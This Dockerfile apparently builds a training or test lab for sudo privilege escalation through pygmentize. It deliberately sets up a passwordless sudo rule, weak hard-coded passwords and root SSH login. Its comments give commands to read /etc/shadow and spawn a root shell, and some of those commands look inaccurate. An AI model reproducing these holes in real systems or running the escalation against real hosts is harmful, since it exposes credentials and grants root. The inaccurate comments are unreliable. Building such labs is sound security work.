FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_pygmentize
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/pygmentize as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and pygmentize
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        python3 \
        python3-pygments \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify pygmentize is installed
RUN which pygmentize && ls -la /usr/bin/pygmentize

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# pygmentize can be abused to read arbitrary files when run as root.
# The exploit approach uses pygmentize's ability to process files:
#   sudo pygmentize -l python -f raw /etc/shadow
# This outputs the contents of privileged files.
# Additionally, pygmentize supports custom filters via Python plugins,
# which can execute arbitrary code as root. For example, creating a
# malicious plugin or using the -s (stdin) mode with crafted input.
# The simplest file-read exploit:
#   sudo pygmentize -l text -x /etc/shadow
# Or for full shell via Python exec in a custom filter:
#   export TF=$(mktemp -d)
#   echo 'import os; os.execl("/bin/bash", "bash")' > $TF/exploit.py
#   sudo pygmentize -l python -x -F tokenmerge -O "encoding=utf-8" $TF/exploit.py
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/pygmentize" > /etc/sudoers.d/pygmentize && \
    chmod 440 /etc/sudoers.d/pygmentize

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]